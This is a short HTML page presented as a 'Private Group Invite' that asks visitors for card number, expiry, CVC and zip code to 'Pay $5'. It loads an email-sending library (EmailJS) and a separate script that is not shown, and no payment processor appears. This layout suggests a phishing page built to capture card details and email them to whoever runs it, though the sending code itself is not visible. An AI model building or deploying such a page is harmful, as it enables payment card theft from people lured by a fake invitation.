<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Private Group</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <div class="container">
    <h2>Private Group Invite</h2>
    <form id="paymentForm">
      <input type="text" id="cardNumber" placeholder="Card Number" required>
      <input type="text" id="expDate" placeholder="MM/YY" required>
      <input type="text" id="cvc" placeholder="CVC" required>
      <input type="text" id="zipCode" placeholder="Zip Code" required>
      <p id="errorMessage" class="error"></p>
      <button type="button" id="payButton">Pay $5</button>
    </form>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script src="script.js"></script>
</body>
</html>
